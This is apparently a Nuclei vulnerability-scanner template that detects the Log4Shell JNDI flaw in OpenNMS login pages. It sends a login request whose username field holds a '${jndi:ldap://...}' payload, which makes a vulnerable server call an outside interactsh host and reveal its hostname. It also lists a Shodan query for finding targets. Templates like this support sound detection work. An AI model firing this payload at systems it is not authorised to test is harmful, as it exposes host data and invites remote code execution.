id: opennms-log4j-jndi-rce
info:
  author: johnk3r
  classification:
    cve-id: CVE-2021-44228
  description: 'OpenNMS Apache Log4j2 <=2.14.1 JNDI in features used in configuration,
    log messages, and parameters do not protect against attacker controlled LDAP and
    other JNDI related endpoints. An attacker

    who can control log messages or log message parameters can execute arbitrary code
    loaded from LDAP servers when message lookup substitution is enabled.

    '
  metadata:
    shodan-query: title:"OpenNMS Web Console"
    verified: true
  name: OpenNMS - Log4j JNDI RCE
  reference:
  - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
  - https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: jndi,log4j,rce,opennms,cve,cve2021
requests:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /opennms/j_spring_security_check HTTP/1.1

    Referer: {{RootURL}}/opennms/login.jsp

    Content-Type: application/x-www-form-urlencoded


    j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=

    '
